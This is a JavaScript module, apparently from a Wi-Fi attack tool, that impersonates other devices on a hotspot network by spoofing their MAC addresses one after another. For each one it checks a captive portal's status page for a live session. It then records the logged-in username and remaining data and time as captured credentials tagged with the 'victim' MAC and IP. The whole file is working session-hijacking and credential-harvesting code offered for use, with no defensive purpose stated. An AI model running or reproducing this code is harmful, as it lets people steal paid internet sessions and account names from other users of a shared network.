const axios = require('axios');
const logger = require('../utils/logger');
const wifiManager = require('./wifi-manager');
const credentialCapture = require('./credential-capture');
const { EventEmitter } = require('events');

const STATUS_URL = 'http://m.net/status';
const CHECK_TIMEOUT = 5000;

const progressEmitter = new EventEmitter();
let isRunning = false;
let shouldCancel = false;
let lastResult = null;

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

async function checkStatusForCurrentMac() {
  try {
    const resp = await axios.get(STATUS_URL, {
      timeout: CHECK_TIMEOUT,
      validateStatus: () => true,
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
    });
    const html = typeof resp.data === 'string' ? resp.data : '';
    if (!html || html.length < 50) {
      return { reachable: true, sessionActive: false, error: 'Response too short' };
    }

    const hasSession = html.includes('remain_bytes_total') || html.includes('تم تسجيل') || html.includes('status.html');
    const lastuser = credentialCapture.parseLastuser(html);
    const bytes = credentialCapture.parseVar(html, 'bytes');
    const time = credentialCapture.parseVar(html, 'time');

    return {
      reachable: true,
      sessionActive: hasSession,
      lastuser,
      bytes,
      time,
      htmlLength: html.length,
      isLoginPage: !hasSession && (html.includes('username') || html.includes('password') || html.includes('تسجيل الدخول')),
    };
  } catch (err) {
    return { reachable: false, sessionActive: false, error: err.message };
  }
}

const sessionDetector = {
  getProgressEmitter() { return progressEmitter; },

  isRunning() { return isRunning; },

  getLastResult() { return lastResult; },

  cancel() {
    shouldCancel = true;
    logger.info('Session detection cancelled by user');
  },

  async detectSessions(devices, options = {}) {
    if (isRunning) {
      return { isSuccess: false, value: null, error: 'Session detection already in progress', statusCode: 409 };
    }

    isRunning = true;
    shouldCancel = false;
    const startTime = Date.now();
    let originalMac = null;
    const results = [];
    const activeSessions = [];

    try {
      originalMac = await wifiManager.getCurrentMac();
      if (!originalMac) {
        throw new Error('Could not determine current MAC address');
      }
      logger.info(`Session detection started, original MAC: ${originalMac}, candidates: ${devices.length}`);

      const candidates = devices
        .filter(d => {
          if (!d.mac) return false;
          const mac = d.mac.toUpperCase().replace(/[:-]/g, ':');
          return (
            mac !== originalMac &&
            mac !== 'FF:FF:FF:FF:FF:FF' &&
            !mac.startsWith('01:00:5E') &&
            !mac.startsWith('33:33:') &&
            !d.duplicateOui &&
            d.ip !== '0.0.0.0' &&
            d.isSameSubnetAsGateway !== false
          );
        })
        .map(d => ({
          ip: d.ip,
          mac: d.mac.toUpperCase().replace(/[:-]/g, ':'),
          vendor: d.vendor || '',
          type: d.type || '',
          hostname: d.hostname || '',
        }));

      if (candidates.length === 0) {
        throw new Error('No suitable devices to scan — all either duplicate OUI, gateway, or invalid');
      }

      const maxDevices = options.maxDevices || candidates.length;
      const limited = candidates.slice(0, maxDevices);

      emitProgress('start', { total: limited.length, originalMac });

      for (let i = 0; i < limited.length; i++) {
        if (shouldCancel) {
          emitProgress('cancelled', { scanned: i, total: limited.length });
          break;
        }

        const device = limited[i];
        emitProgress('probing', {
          index: i + 1,
          total: limited.length,
          device,
        });

        let macOk = false;
        try {
          await wifiManager.spoofMac(device.mac);
          macOk = true;
        } catch (spoofErr) {
          emitProgress('error', { device, error: spoofErr.message });
        }

        if (!macOk) {
          const failResult = { ...device, hasActiveSession: false, error: 'MAC spoof failed (all attempts)' };
          results.push(failResult);
          emitProgress('error', { device, error: 'MAC spoof failed' });
          continue;
        }

        await sleep(1500);

        const status = await checkStatusForCurrentMac();

        const deviceResult = {
          ...device,
          hasActiveSession: status.sessionActive,
          lastuser: status.lastuser,
          bytes: status.bytes,
          time: status.time,
          reachable: status.reachable,
          error: status.error || null,
        };

        results.push(deviceResult);

        if (status.sessionActive) {
          activeSessions.push(deviceResult);
          if (status.lastuser) {
            credentialCapture.addCredential(status.lastuser, {
              source: 'session-detector',
              victimMac: device.mac || '',
              victimIp: device.ip || '',
              remainingBytes: status.bytes != null ? parseInt(status.bytes, 10) : null,
              remainingTime: status.time != null ? parseInt(status.time, 10) : null,
              ssid: device.ssid || '',
              gatewayIp: device.gatewayIp || '',
            });
          }
        }

        emitProgress('result', {
          device: deviceResult,
          activeCount: activeSessions.length,
          scanned: i + 1,
          total: limited.length,
        });
      }
    } catch (err) {
      logger.error('Session detection error:', err.message);
      emitProgress('error', { error: err.message });
      return { isSuccess: false, value: null, error: err.message, statusCode: 500 };
    } finally {
      if (!shouldCancel) {
        for (let attempt = 0; attempt < 3; attempt++) {
          try {
            await wifiManager.resetMac();
            logger.info('Original MAC restored after session detection');
            break;
          } catch (restoreErr) {
            logger.warn(`MAC restore attempt ${attempt + 1} failed:`, restoreErr.message);
            await sleep(2000);
          }
        }
      }
      isRunning = false;
      await sleep(1000);
    }

    const elapsed = Date.now() - startTime;
    const result = {
      total: results.length,
      activeSessions: activeSessions.length,
      cancelled: shouldCancel,
      elapsed,
      devices: results,
      activeDevices: activeSessions,
    };

    lastResult = result;
    emitProgress('complete', result);

    return {
      isSuccess: true,
      value: result,
      error: null,
      statusCode: 200,
    };
  },
};

function emitProgress(step, data) {
  progressEmitter.emit('session-detect', { step, data, timestamp: Date.now() });
}

module.exports = sessionDetector;
